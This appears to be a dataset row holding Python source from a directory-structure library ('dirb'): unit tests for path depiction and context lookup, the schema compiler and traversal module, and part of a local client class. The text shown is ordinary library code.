    found = pathexpr.create_parameter_collect( sexpr.loads( ""(parameters (key1 value1) (key2 value2))"" ))
    expected = {'key2': ('value2',), 'key1': ('value1',)}
    self.assertEqual( found, expected )
    
  # ----------------------------------------
  def test_parameter_collect_and(self):
    found = pathexpr.create_parameter_collect( sexpr.loads( ""(and (parameters (key1 value1)) (parameters (key1 value1) (key2 value2)))"" ))
    self.assertEqual( set(found['key1']), set(('value1',)) )
    self.assertEqual( set(found.keys()), set(('key1',)) )
    
  # ----------------------------------------
  def test_parameter_collect_or(self):
    found = pathexpr.create_parameter_collect( sexpr.loads( ""(or (parameters (key1 value1)) (parameters (key2 value2)))"" ))
    self.assertEqual( set(found['key1']), set(('value1',)) )
    self.assertEqual( set(found['key2']), set(('value2',)) )
    self.assertEqual( set(found.keys()), set(('key1','key2')) )
    
  # ----------------------------------------
  def test_depict_paths_rootonly(self):
    searchexpr = '(parameters (show SHOW))'
    foundlist = self.d.depict_paths( searchexpr )
    foundlist = set( x.path for x in foundlist )
    expected = set((
      '/tmp/dirbtest1/projects/SHOW',))
    self.assertEqual( foundlist, expected )
    
  # ----------------------------------------
  def test_depict_paths_collect_exception(self):
    searchexpr = '(parameters (show SHOW) (sequence SEQUENCE) (shot SHOT) (dept DEPT))'
    # this is not a valid path specification, because DEPT is not in the 'department' collection.
    self.assertRaises( KeyError, self.d.depict_paths, searchexpr )
    
  # ----------------------------------------
  def test_depict_paths_multiparam_multidir(self):
    searchexpr = '(parameters (show SHOW) (sequence SEQUENCE) (shot SHOT) (dept animation))'
    # ""open"" parameterizations like this will build the entire ancestor hierarchy
    foundlist = self.d.depict_paths( searchexpr )
    foundlist = set( x.path for x in foundlist )
    expected = set((
      '/tmp/dirbtest1/projects/SHOW/sequence/SEQUENCE/SHOT',
      '/tmp/dirbtest1/projects/SHOW/asset',
      '/tmp/dirbtest1/projects/SHOW',
      '/tmp/dirbtest1/projects/SHOW/sequence',
      '/tmp/dirbtest1/projects/SHOW/sequence/SEQUENCE',
      '/tmp/dirbtest1/projects/SHOW/sequence/SEQUENCE/SHOT/animation'))
    self.assertEqual( foundlist, expected )   
    
  # ----------------------------------------
  def test_depict_paths_multiparam_bookmark(self):
    searchexpr = '(and (bookmark workarea) (parameters (show SHOW) (sequence SEQUENCE) (shot SHOT) (dept animation)))'
    # the bookmark forces only workareas, not the entire hierarchy up to the parameterized leaf.
    foundlist = self.d.depict_paths( searchexpr )
    foundlist = set( x.path for x in foundlist )
    expected = set((
      '/tmp/dirbtest1/projects/SHOW/sequence/SEQUENCE/SHOT/animation',))
    self.assertEqual( foundlist, expected )   
    
  # ----------------------------------------
  def test_depict_paths_andor(self):
    searchexpr = """"""
      (and 
        (bookmark workarea) 
        (or 
          (parameters (sequence SEQUENCE) (shot SHOT))
          (parameters (assettype TYPE) (asset ASSET))
          (parameters (show SHOW) (dept lighting))
        )
      )""""""
    # the bookmark forces only workareas, not the entire hierarchy up to the parameterized leaf.
    foundlist = self.d.depict_paths( searchexpr )
    foundlist = set( x.path for x in foundlist )
    expected = set((
      '/tmp/dirbtest1/projects/SHOW/sequence/SEQUENCE/SHOT/lighting',
      '/tmp/dirbtest1/projects/SHOW/asset/TYPE/ASSET/lighting'))
    self.assertEqual( foundlist, expected )
  
  # ----------------------------------------
  def test_get_path_context_realpath( self ):
    targetpath = '/tmp/dirbtest1/projects/show/asset/vehicle/car1/lighting'
    found = self.d.get_path_context( targetpath )
    expected = set( {'dept': 'lighting', 'assettype': 'vehicle', 'asset': 'car1', 'show': 'show'}.items() )
    self.assertEqual( found.path, targetpath )
    self.assertEqual( set(found.parameters.items()), expected )
    
  # ----------------------------------------
  def test_get_path_context_realpath2( self ):
    targetpath = '/tmp/dirbtest1/projects/show/sequence/bb'
    found = self.d.get_path_context( targetpath )
    expected = set( {'sequence': 'bb', 'show': 'show'}.items() )
    self.assertEqual( found.path, targetpath )
    self.assertEqual( set(found.parameters.items()), expected )
    
  # ----------------------------------------
  def test_get_path_context_depictedpath( self ):
    targetpath = '/tmp/dirbtest1/projects/newshow/asset/character/bigguy/animation'
    # this targetpath does not actually exist on disk, but can still be interrogated
    found = self.d.get_path_context( targetpath )
    expected = set( {'dept': 'animation', 'assettype': 'character', 'asset': 'bigguy', 'show': 'newshow'}.items() )
    self.assertEqual( found.path, targetpath )
    self.assertEqual( set(found.parameters.items()), expected )

  # ----------------------------------------
  def test_get_path_context_depictedfilename( self ):
    targetpath = '/tmp/dirbtest1/projects/SHOW/sequence/SEQUENCE/SHOT/animation/application/scenes/filename.scene'
    # it is okay to go deeper than the directory structure understands, it will return the deepest context it knows
    found = self.d.get_path_context( targetpath )
    expected = set( {'dept': 'animation', 'sequence': 'SEQUENCE', 'shot': 'SHOT', 'show': 'SHOW'}.items() )
    self.assertEqual( found.path, '/tmp/dirbtest1/projects/SHOW/sequence/SEQUENCE/SHOT/animation' )
    self.assertEqual( set(found.parameters.items()), expected )

  # ----------------------------------------
  def test_get_path_context_depictedpath_badcollection( self ):
    targetpath = '/tmp/dirbtest1/projects/falseshow/asset/set/castle/infantry'
    # department value in this targetpath is not a member of the department collection
    self.assertRaises( KeyError, self.d.get_path_context, targetpath )
  
  # ----------------------------------------
  def test_get_path_context_shallow( self ):
    targetpath = '/tmp/dirbtest1/projects/SHOW/editorial/workarea'
    # targetpath is not compatible with this directory structure
    found = self.d.get_path_context( targetpath )
    self.assertEqual( found.path, '/tmp/dirbtest1/projects/SHOW' )
    
  # ----------------------------------------
  def test_get_path_context_notvalidpath( self ):
    targetpath = '/tmp/dirbtest1/thing/SHOW'
    # targetpath is not compatible with this directory structure
    found = self.d.get_path_context( targetpath )
    self.assertEqual( found, None )
  
  # ----------------------------------------
  def test_get_frontier_contexts_root( self ):
    targetpath = '/tmp/dirbtest1/projects'
    found = self.d.get_frontier_contexts( targetpath )
    expected_keys = [""show""]
    expected_parameters = {'show':'show'}
    self.assertEqual( set(found.keys()), set(expected_keys) )
    self.assertEqual( len( found['show'] ), 1 )
    self.assertEqual( found['show'][0].parameters, expected_parameters )
    
  # ----------------------------------------
  def test_get_frontier_contexts_cluster( self ):
    targetpath = '/tmp/dirbtest1/projects/show/sequence'
    found = self.d.get_frontier_contexts( targetpath )
    expected_keys = [""sequence""]
    expected_parameters = set(['aa','bb','cc'])
    self.assertEqual( set(found.keys()), set(expected_keys) )
    self.assertEqual( len( found['sequence'] ), len(expected_parameters) )
    found_parameters = set( i.parameters['sequence'] for i in found['sequence'] )
    self.assertEqual( set(found_parameters), expected_parameters )

  # ----------------------------------------
  def test_get_frontier_contexts_branch( self ):
    targetpath = '/tmp/dirbtest1/projects/show'
    found = self.d.get_frontier_contexts( targetpath )
    expected_keys = set([""sequence"",'assettype'])
    expected_parameters = set(['aa','bb','cc'])
    self.assertEqual( set(found.keys()), expected_keys )
    self.assertEqual( len( found['sequence'] ), len(expected_parameters) )
    found_parameters = set( i.parameters['sequence'] for i in found['sequence'] )
    self.assertEqual( set(found_parameters), expected_parameters )
    
    expected_parameters = set(['vehicle'])
    self.assertEqual( len( found['assettype'] ), len(expected_parameters) )
    found_parameters = set( i.parameters['assettype'] for i in found['assettype'] )
    self.assertEqual( set(found_parameters), expected_parameters )
    
  # ----------------------------------------
  def tearDown(self):
    # TODO should we remove the directories we created?
    pass
  
# ==========================================

class SimplePermissionsTest(unittest.TestCase): 

  def setUp(self):

    self.doc = ds.compile_dir_structure( { 
      'collections' : {""datatype"":[""caches"",""scenes"",""images""], 'assettype':['character','prop','vehicle','set']},
      'rules' : {
          
        'ROOT' : [
                ['BranchLevel', {'rules':['assets','shots']}],
                ],
        
        'shots' : [
                ['ParameterizedLevel', { ""key"":'datatype', ""collection"":""datatype"", 'user':'root', 'group':'root', 'permissions':'rwxr-xr-x'}],
                ['ParameterizedLevel', { ""key"":'show'}],
                ['ParameterizedLevel', { ""key"":'sequence'}],
                ['ParameterizedLevel', { ""key"":'shot', 'bookmarks':['shotroot']}],
                ['ParameterizedLevel', { ""key"":'user', 'bookmarks':['workarea'], 'user':'(parameter user)', 'group':'shotdept', 'permissions':'rwxr-x---' }]
                ],                
          
          
        'assets' :[
                ['FixedLevel', {""name"":'assets', 'user':'root', 'group':'root', 'permissions':'rwxr-xr-x'}],
                ['ParameterizedLevel', { ""key"":'show', 'group':'assetdept'}],
                ['ParameterizedLevel', { ""key"":'assettype', 'collection':'assettype'}],
                ['ParameterizedLevel', { ""key"":'assetname', 'bookmarks':['assetroot'] }],
                ['ParameterizedLevel', { ""key"":'user', 'bookmarks':['workarea'], 'user':'(parameter user)', 'permissions':'rwxr-x---' }]
            ]
        }
    } )
    self.d = localclient.LocalClient( self.doc, ""/tmp/dirbtest1/projects"" )

  # ----------------------------------------
  def test_simple_depict1(self):
    createexpr = '(and (bookmark workarea) (parameters (show diehard)(assettype vehicle)(assetname gunshipA)(user bwillis)))'
    foundlist = self.d.depict_paths( createexpr )
    self.assertEqual( 1, len(foundlist) )
    expected = { 'attributes':{}, 'parameters':{'assetname': 'gunshipA', 'assettype': 'vehicle', 'user': 'bwillis', 'show': 'diehard'}, 'path':'/tmp/dirbtest1/projects/assets/diehard/vehicle/gunshipA/bwillis', 'collections':{'assettype': 'assettype'}, 'user':'bwillis', 'group':'assetdept', 'permissions':488 }
    found = foundlist[0]
    self.assertEqual( found.attributes, expected['attributes'] )
    self.assertEqual( found.parameters, expected['parameters'] )
    self.assertEqual( found.path, expected['path'] )
    self.assertEqual( found.collections, expected['collections'] )
    self.assertEqual( found.user, expected['user'] )
    self.assertEqual( found.group, expected['group'] )
    self.assertEqual( found.permissions, expected['permissions'] )
    
  # ----------------------------------------
  def test_simple_depict2(self):
    createexpr = '(and (bookmark workarea) (parameters (datatype caches)(show diehard)(sequence QQQ)(shot TTT)(user bwillis)))'
    foundlist = self.d.depict_paths( createexpr )
    self.assertEqual( 1, len(foundlist) )
    expected = { 'attributes':{}, 'parameters':{'datatype': 'caches', 'sequence': 'QQQ', 'shot': 'TTT', 'user': 'bwillis', 'show': 'diehard'}, 'path':'/tmp/dirbtest1/projects/caches/diehard/QQQ/TTT/bwillis', 'collections':{'datatype': 'datatype'}, 'user':'bwillis', 'group':'shotdept', 'permissions':488 }
    found = foundlist[0]
    self.assertEqual( found.attributes, expected['attributes'] )
    self.assertEqual( found.parameters, expected['parameters'] )
    self.assertEqual( found.path, expected['path'] )
    self.assertEqual( found.collections, expected['collections'] )
    self.assertEqual( found.user, expected['user'] )
    self.assertEqual( found.group, expected['group'] )
    self.assertEqual( found.permissions, expected['permissions'] )
    
  # ----------------------------------------
  def test_simple_depict3(self):
    createexpr = '(and (bookmark shotroot) (parameters (datatype images)(show dh2)(sequence qqq)(shot ttt)(user arickman)))'
    foundlist = self.d.depict_paths( createexpr )
    self.assertEqual( 1, len(foundlist) )
    expected = { 'attributes':{}, 'parameters':{'datatype': 'images', 'show': 'dh2', 'shot': 'ttt', 'sequence': 'qqq'}, 'path':'/tmp/dirbtest1/projects/images/dh2/qqq/ttt', 'collections':{'datatype': 'datatype'}, 'user':'root', 'group':'root', 'permissions':493 }
    found = foundlist[0]
    self.assertEqual( found.attributes, expected['attributes'] )
    self.assertEqual( found.parameters, expected['parameters'] )
    self.assertEqual( found.path, expected['path'] )
    self.assertEqual( found.collections, expected['collections'] )
    self.assertEqual( found.user, expected['user'] )
    self.assertEqual( found.group, expected['group'] )
    self.assertEqual( found.permissions, expected['permissions'] )
    
  # ----------------------------------------
  def tearDown(self):
    pass
  

  
  
#####################################################################
if __name__ == '__main__':
    unittest.main()


/n/n/n",0
151,10e70875b059602c3117cc40a75a980b5e88edc5,"/dirb/ds.py/n/n#####################################################################
#
# Copyright 2015 Mayur Patel
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License. 
# 
#####################################################################

from . import pathexpr
from . import attrexpr
from . import ugoexpr

from . import fs

import copy
import collections
import itertools
import os
import glob



# A directory structure object:
#
# (1) has a schema,
# A set of rules which outline the tree-structure for the file system.
# One rule must be called ""ROOT"", but traversal can begin from anywhere
# and from any rule.
#
# (3) has collections, which connect with metadata
# It is handy to use collections as part of the directory structure,
# for example, to be able to use a departments list as a parameter
# for work area or publish area builds.
#
# (2) has globals, which are attributes that do not vary per-location.
#
#
# A directory location 
#   has an optional bookmark definition, which implicitly a parameterization by which the bookmark can be found.
#       in some ways, an bookmark is really just a special attribute tag.  
#       A bookmark can appear in different places, meaning that it can have multiple parameterizations
#       a bookmark is not inherited
#   has attributes, which can either be inherited down or not. (treeattribute, localattribute)
#   might be parameterized or not. a parameter is either unrestricted or restricted to a selection from a collection and
#   has a default owner and permissions.  The owner could be parameterized.
#
# Directory locations are stacked into rules as much as possible:
#   reduces the complexity of many kinds of structure schemas
#   allows optimizations to be placed strategically.
#   allows us to keep most of the directory structure as an explicit map/list,
#      converting on the absolutely bare essentials into additional complexity.
#
# Directory structure is meant to be flexible but not DYNAMIC!
#      You might want to change it a couple times a year, but not every day
#
# Need to resolve ambiguous paths by being strict with search order.
#     ""fixed"" directories should be listed first, in the reference list.
#     parameterized directories should be listed last (and ideally, there's only one!)
#




# before being compiled:
""""""

{
  
  'collections' : {
    },
    
  'globals' : {},
  
  'rules' : {
  
    'ROOT' : [
        ['multiple', { 
            'key' : 'department'
            'bookmarks' : ['workarea'],
            'localattributes' : {},
            'treeattributes' : {},
            'user' : '(parameter user)',
            'group' : 'vfx',
            'permissions' : 'rwxr-xr-x' 
         }],
        
        ['directory', {
           'name' : 'value'
         }]
      
      ],
    
    'alternative' : [
      ],
    
    'rule2' : [
      ]
    }
}

""""""

""""""
a rule is a list of directory levels.
a compiled rule has:
   a set of bookmarks under it
   a set of parameters under it
   a set of attributes under it

Directory level types:
  fixed : one or more fixed names, not parameterized
     fields : bookmarks, local attrs, tree attrs, name, user, group, permissions
  branch : redirects to one or more other rules, IN ORDER, no special attributes of its own
     fields: rules
  parameterized : any number of parameterized directories, there is one key and potentially many values.
     fields : bookmarks, local attrs, tree attrs, key, collection, user group, permissions
     if there is an collection attribute, then the values are restricted.
  regex : can represent zero or more parameters, as defined by the groups in the expression.  Also good when
     there is a prefix or suffix or restrictions on the character set.
     fields: bookmarks, local attrs, tree attrs, pattern, collections, user, group, permissions
     regex is TODO
""""""

FnLevel = {} # use of a singleton impairs ability to run multi-threaded, locks should be placed inside the level methods that need them.

# we use a class decorator here, instead of metaclasses for example,
# because what we really want is a dictionary of class instances (singletons actually),
# not some dictionary of classes, or other kind of class manipulation.
def register_level( cls ) :
  FnLevel[cls.__name__] = cls()
  return cls


class BaseLevel(object):
  def __init__(self):
    pass
  
  def validate( self, levelfields, path_list, client ): # for use during compile (?)
    return True
  
  def get_directories( self, levelctx, levelfields, searcher, ctxlist, client ):
    return []
  
  def get_bookmarks( self, levelfields, doc ): # used during compile
    return set(levelfields['bookmarks'] if 'bookmarks' in levelfields else [])
  
  def get_attributes( self, levelfields, doc ): # used during compile
    keys = levelfields['localattributes'].keys() if 'localattributes' in levelfields else []
    keys.extend( levelfields['treeattributes'].keys() if 'treeattributes' in levelfields else [] )
    return set( keys )
    
  def get_parameters( self, levelfields, doc ): # used during compile
    return set([levelfields['key']] if 'key' in levelfields else [])



@register_level
class FixedLevel(BaseLevel) :
  def __init__(self):
    BaseLevel.__init__(self) # can't use super() because we instance the class before definition is complete!
  
  def get_directories( self, levelctx, levelfields, searcher, ctxlist, client ):
    candidates = [(x, os.path.join(x.path, levelfields['name'])) for x in ctxlist]
    if searcher.do_existing_paths() :
      candidates = [(x, y) for x, y in candidates if os.path.isdir(y)]
    return candidates
    
  def get_parameters( self, levelfields, doc ): # used during compile
    return set()
  
@register_level
class BranchLevel(BaseLevel) :
  def __init__(self):
   BaseLevel.__init__(self) # can't use super() because we instance the class before definition is complete!
  
  def get_directories( self, levelctx, levelfields, searcher, ctxlist, client):
    rulenames = levelfields['rules']
    for rulename, ctx in itertools.product( rulenames, ctxlist ) :
      rule = client.get_rule( rulename )
      _traverse( searcher, rule, ctx, client ) # indirect recursion
    return None
  
  def get_bookmarks( self, levelfields, doc ):
    bookmarks = set()
    rulenames = levelfields['rules']
    for rulename in rulenames :
      rule = doc['rules'][ rulename ]
      bookmarks |= get_rule_bookmarks(rule,doc)
    return bookmarks
  
  def get_attributes( self, levelfields, doc ):
    attributes = set()
    rulenames = levelfields['rules']
    for rulename in rulenames :
      rule = doc['rules'][ rulename ]
      attributes |= get_rule_attributes(rule,doc)
    return attributes
    
  def get_parameters( self, levelfields, doc ):
    parameters = set()
    rulenames = levelfields['rules']
    for rulename in rulenames :
      rule = doc['rules'][ rulename ]
      parameters |= get_rule_parameters(rule,doc)
    return parameters



@register_level
class ParameterizedLevel(BaseLevel) :
  def __init__(self):
    BaseLevel.__init__(self) # can't use super() because we instance the class before definition is complete!
  
  def get_directories( self, levelctx, levelfields, searcher, ctxlist, client ):
    doexisting = searcher.do_existing_paths()
    dirlist = []
    
    if doexisting :
      
      for ictx in ctxlist:
        ctxdirs = glob.glob( os.path.join( ictx.path, '*' ))
        ctxdirs = ( x for x in ctxdirs if os.path.isdir( x ))
        
        if 'collection' in levelfields:
          coll = client.get_collection( levelfields['collection'] )
          ctxdirs = ( x for x in ctxdirs if os.path.split(x)[-1] in coll )
          
        dirlist.extend( (ictx, x) for x in ctxdirs )
      
    else:
      
      values = []
      if 'key' in levelfields:
        search_param = searcher.get_parameters(levelfields['key'], levelctx, ctxlist)
        if search_param:
          values.extend( x for x in search_param if x ) # eliminate None values
          
      if 'collection' in levelfields:
        coll = client.get_collection( levelfields['collection'] )
        bad_values = [x for x in values if x not in coll]
        if bad_values:
          raise KeyError( ""Collection '%s' does not contain %s"" % (levelfields['collection'], ','.join(""'%s'"" % x for x in bad_values)))
      
      for ctx, value in itertools.product( ctxlist, values ):
        dirlist.append((ctx, os.path.join( ctx.path, value )))
          
    return dirlist 
  
# -----------

def get_rule_bookmarks( levellist, doc ) : # used during compile
  ret = set()
  for level in levellist:
    leveltype = level[0]
    levelfields = level[1]
    ret |= FnLevel[leveltype].get_bookmarks( levelfields, doc)
  return ret
  
def get_rule_attributes( levellist, doc ): # used during compile
  ret = set()
  for level in levellist:
    leveltype = level[0]
    levelfields = level[1]
    ret |= FnLevel[leveltype].get_attributes( levelfields, doc)
  return ret

def get_rule_parameters( levellist, doc ): # used during compile
  ret = set()
  for level in levellist:
    leveltype = level[0]
    levelfields = level[1]
    ret |= FnLevel[leveltype].get_parameters( levelfields, doc)
  return ret  




RuleTraversalContext = collections.namedtuple( ""RuleTraversalContext"", (""bookmarks"", ""attributes"", ""parameters"")) # elements of levels contained
PathTraversalContext = collections.namedtuple( ""PathTraversalContext"", (""attributes"", ""parameters"", ""path"", ""collections"", ""user"", ""group"", ""permissions"") ) # includes attrs and params from current level
LevelTraversalContext = collections.namedtuple( ""LevelTraversalContext"", ( ""bookmarks"", ""treeattributes"", ""localattributes"", ""parameter"", ""collection"", ""user"", ""group"", ""permissions"" )) # elements of current level only



def _traverse( searcher, rule, ctx, client ):
  if searcher.does_intersect_rule( RuleTraversalContext( rule['bookmarks'], rule['attributes'], rule['parameters'] ) ):
    
    pathlist = [ctx]
    for leveltype, levelfields in rule[ 'levels' ]:
      
      # create new level context:
      levelbookmarks = levelfields['bookmarks'] if 'bookmarks' in levelfields else []
      leveltreeattr = levelfields['treeattributes'] if 'treeattributes' in levelfields else {}
      levellocalattr = levelfields['localattributes'] if 'localattributes' in levelfields else {}
      levelparameter = levelfields['key'] if 'key' in levelfields else None
      levelcollection = levelfields['collection'] if 'collection' in levelfields else None
      leveluser = levelfields['user'] if 'user' in levelfields else None
      levelgroup = levelfields['group'] if 'group' in levelfields else None
      levelpermissions = levelfields['permissions'] if 'permissions' in levelfields else None
      
      levelctx = LevelTraversalContext( levelbookmarks, leveltreeattr, levellocalattr, levelparameter, levelcollection, leveluser, levelgroup, levelpermissions )
      
      # get directories for this level
      ruletuples = FnLevel[ leveltype ].get_directories( levelctx, levelfields, searcher, pathlist, client )
      
      if not ruletuples:
        break # end for
      
      passedlist = []
      for ictx, dirname in ruletuples: # breadth-first search with pruning

        treeattr = ictx.attributes.copy() # shallow
        if 'treeattributes' in levelfields:
          treeattr.update( leveltreeattr )
          
        localattr = treeattr.copy() # shallow
        if 'localattributes' in levelfields:
          localattr.update( levellocalattr )
          
        parameters = ictx.parameters.copy() # shallow
        collections = ictx.collections.copy() # shallow
        if levelparameter :
          basename = os.path.basename( dirname )
          parameters[ levelparameter ] = basename
          if levelcollection:
            collections[ levelparameter ] = levelcollection
            
        user = attrexpr.eval_attribute_expr( leveluser, localattr, parameters ) if leveluser else ictx.user
        group = attrexpr.eval_attribute_expr( levelgroup, localattr, parameters ) if levelgroup else ictx.group
        permissions = ugoexpr.eval_ugo_expr( levelpermissions ) if levelpermissions else ictx.permissions
        
        newctx = PathTraversalContext( localattr, parameters, dirname, collections, user, group, permissions )
        test = searcher.does_intersect_path( newctx )
        if test:
          searcher.test( newctx, levelctx )
          newctx = PathTraversalContext( treeattr, parameters, dirname, collections, user, group, permissions ) # context that the children see & modify
          passedlist.append( newctx )
        
      pathlist = passedlist

  return

  
""""""
a rule is a list of directory levels.
a compiled rule has:
   a set of bookmarks under it
   a set of parameters under it
   a set of attributes under it

Directory level types:
  fixed : one or more fixed names, not parameterized
     fields : bookmarks, local attrs, tree attrs, name
  branch : redirects to one or more other rules, IN ORDER, no special attributes of its own
     fields: rules
  parameterized : any number of parameterized directories, there is one key and potentially many values.
     fields : bookmarks, local attrs, tree attrs, key, collection,
     if there is an collection attribute, then the values are restricted.
     """"""

def compile_dir_structure( doc ):
    ""returns a compiled version of the input document""
    ret ={ 'globals': {}, 'collections':{}, 'rules':{} }
    # copy globals:
    if 'globals' in doc:
      ret['globals'] = copy.deepcopy( doc['globals'] )
    # copy collections:
    if 'collections' in doc:
      ret['collections'] = copy.deepcopy( doc['collections'] )
    # copy rules:
    if 'rules' in doc:
      # a document rule is a key-value pair
      #    name of the rule is the key
      #    list of levels is the value.
      for rulename in doc['rules']:
        levellist = doc['rules'][rulename]
        ret['rules'][rulename] = {
          'levels' : copy.deepcopy( levellist ),
          'bookmarks' : tuple(get_rule_bookmarks(levellist, doc)),
          'parameters' : tuple(get_rule_parameters(levellist, doc)),
          'attributes' : tuple(get_rule_attributes(levellist, doc))
          }
    return ret

# -----------
/n/n/n/dirb/localclient.py/n/n#####################################################################
#
# Copyright 2015 Mayur Patel
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License. 
# 
#####################################################################

from . import pathexpr
from . import ds
from . import fs

# a compiledrule is a dictionary with fields:
#    ""bookmarks"": set of bookmarks (under it)
#    ""parameters"" : set of parameters (keys only) (under it) 
#    ""attributes"" : set of attributes (keys only) (under it)
#    ""levels"" : tuples of tuples, (( ""leveltype"", {<levelfields>}),( ""leveltype"", {<levelfields>}),etc)
#    as traversal occurs, the bookmarks, parameter, attributes move from rules to the contexts as they resolve.
#

#
# A searcher has :
# does_intersect_rule( self, rulectx ) return bool if the rule might contain our target
# does_intersect_path( self, pathctx ) returns bool if the path might contain our target
# test( self, pathctx, levelctx ) to detemine whether this level is our target
# do_existing_paths() : bool, are we traversing real directories on disk, or is this theoretical?
# get_parameters( self, key, levelctx, pathctxlist ) : if this is a theoretical traversal, then the searcher needs to supply possible values, for each parameter key, to advance the search.


  

class LocalClient( object ) :
  def __init__(self, compileddoc, startingpath ):
    self._doc = compileddoc
    self._root = startingpath

  def get_rule_names( self ):
    return self._doc['rules'].keys()
  
  def get_rule( self, rulename ): # advanced API, not necessarily public; returns compiled rule
    return self._doc['rules'][rulename] if rulename in self._doc['rules'] else None
  
  def get_collection_names( self ):
    return self._doc['collections'].keys()
  
  def get_collection( self, collectionname ) : 
    return self._doc['collections'][collectionname] if collectionname in self._doc['collections'] else None
  
  def get_global_names( self ):
    return self._doc['globals'].keys()
  
  def get_global( self, attrname ):
    return self._doc['globals'][attrname] if attrname in self._doc['globals'] else None

  def traverse( self, searcher ): # advanced API, not necessarily public
    ctx = ds.PathTraversalContext( {}, {}, self._root, {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    client = self
    return ds._traverse( searcher, rule, ctx, client )
  
  def get_bookmark_names( self ) :
    return self._doc['rules']['ROOT']['bookmarks']
  
  def get_bookmark_parameters( self, bookmark ):
    """"""returns the parameters required to find the bookmark.  A list of dictionaries.  Each dictionary is a set of parameters required to find the bookmark.  The key is the parameter name and the value determines which, if any, collection the parameter is associated with.""""""
    class SearcherBookmarks( object ):
      def __init__( self, dirstructure ) :
        self._store = []
        self._ds = dirstructure
      def does_intersect_rule( self, rulectx ):
        return bookmark in rulectx.bookmarks
      def does_intersect_path( self, pathctx ):
        return True
      def test( self, pathctx, levelctx ):
        if bookmark in levelctx.bookmarks:
          found = ( (x,None) if x not in pathctx.collections else (x,pathctx.collections[x]) for x in pathctx.parameters.keys() )
          self._store.append( dict(found) )
      def do_existing_paths( self ) :
        return False
      def get_parameters( self, key, levelctx, pathctxlist ):
        if levelctx.collection:
          coll = self._ds.get_collection( levelctx.collection )
          return (coll[0],)
        else:
          return ('X',)
    searcher = SearcherBookmarks( self )
    ctx = ds.PathTraversalContext( {}, {}, '', {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    ds._traverse( searcher, rule, ctx, self )  
    return searcher._store
  
  def search_paths( self, searchexpr ):
    """"""implies a query, with a specific predicate or filter to narrow the search, returns only paths that exist""""""
    searcher = pathexpr.SearcherExists( self, searchexpr )
    ctx = ds.PathTraversalContext( {}, {}, self._root, {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    ds._traverse( searcher, rule, ctx, self )  
    return searcher._store
  
  def depict_paths( self, createexpr ):
    ""this returns a not-exists path, but does not make a directory on disk""
    searcher = pathexpr.SearcherNotExists( self, createexpr )
    ctx = ds.PathTraversalContext( {}, {}, self._root, {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    ds._traverse( searcher, rule, ctx, self )  
    return searcher._store
  
  def get_path_context( self, targetpath ):
    ""returns the path traversal context for the given path, works for real paths or depicted paths, will reject invalid paths, will accept paths deeper than what the structure knows about giving the deepest context it can""
    class SearcherPath( object ):
      def __init__( self, targetpath, client ) :
        self._splitpath = fs.split_path( targetpath )
        self._lensplitpath = len( self._splitpath )
        self._store = {} # this keeps matches, indexed by their depths
        self._ds = client
      def does_intersect_rule( self, rulectx ):
        return True
      def does_intersect_path( self, pathctx ):
        testpath = fs.split_path( pathctx.path )
        lentestpath = len(testpath)
        lenpath = min( self._lensplitpath, lentestpath )
        does_pass = self._splitpath[:lenpath] == testpath and lentestpath <= self._lensplitpath
        if does_pass and lentestpath not in self._store :
          # when we reach a new depth, we create a new entry in our storage
          self._store[lentestpath] = []
        return does_pass
      def test( self, pathctx, levelctx ):
        testpath = fs.split_path( pathctx.path )
        lenpath = min( self._lensplitpath, len(testpath))
        if self._splitpath[:lenpath] == testpath[:lenpath] :
          # store hits at the depth they occur:
          self._store[lenpath].append( pathctx )
      def do_existing_paths( self ) :
        return False
      def get_parameters( self, key, levelctx, pathctxlist ):
        # we get parameters from the path itself
        ret = set()
        for pathctx in pathctxlist :
          testpath = fs.split_path( pathctx.path )
          lenpath = len(testpath)
          if self._lensplitpath > lenpath:
            ret.add( self._splitpath[lenpath] )
        return ret
      
    searcher = SearcherPath( targetpath, self )
    ctx = ds.PathTraversalContext( {}, {}, self._root, {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    ds._traverse( searcher, rule, ctx, self )
    ret = ctx if targetpath == self._root else None
    if searcher._store :
      # all depths in the traversal needed to have a match, otherwise the path was not valid for the directory structure:
      if all( searcher._store[i] for i in searcher._store ):
        # we want to return the deepest match:
        key = max( searcher._store.keys() )
        assert 1 == len(searcher._store[key]), ""Multiple targets found for single path (%s)"" % targetpath
        ret = searcher._store[key][0]
    return ret

  def get_frontier_contexts( self, targetpath ):
    """"""given an existing path, returns the 'next' parameter to be defined, as well as the paths to which that parameter leads.
    necessary for UI development.
    returns a dictionary where the key is the parameter name, and the value is the list of directories associated with that parameter
    
    """"""
    """"""
    
    implementation details:
    set of parameters:
    calculate extra parameters
    calculate missing parameters
    if there are missing parameters, then cull the search
    if there is one extra parameter, then add it to the hits
    if there is zero extra parameters, then continue
    if there is more than one extra parameters, then cull the search
    
    """"""
    class SearcherPath( object ):
      def __init__( self, targetctx, client ) :
        self._splitpath = fs.split_path( targetctx.path )
        self._targetparam = set( targetctx.parameters.keys() )
        self._lensplitpath = len( self._splitpath )
        self._store = {}
        self._ds = client
      def does_intersect_rule( self, rulectx ):
        return True
      def does_intersect_path( self, pathctx ):
        testpath = fs.split_path( pathctx.path )
        lentestpath = len(testpath)
        lenpath = min( self._lensplitpath, lentestpath )
        extra_count = len( set( pathctx.parameters.keys() ) - self._targetparam )
        return self._splitpath[:lenpath] == testpath[:lenpath] and extra_count < 2
      def test( self, pathctx, levelctx ):
        path_set = set( pathctx.parameters.keys() )
        extra_param = path_set - self._targetparam
